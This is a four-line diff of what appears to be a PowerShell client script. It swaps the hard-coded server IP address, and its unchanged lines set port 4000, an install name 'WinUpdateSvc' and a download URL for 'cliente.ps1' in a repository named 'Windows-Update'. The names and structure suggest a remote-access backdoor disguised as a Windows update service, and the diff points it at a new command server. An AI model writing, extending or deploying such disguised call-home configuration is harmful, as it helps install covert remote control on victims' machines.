@@ -1,4 +1,4 @@
-$serverIP = "198.1.195.204"
+$serverIP = "191.178.177.175"
 $serverPort = 4000
 $installName = "WinUpdateSvc"
 $myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1"
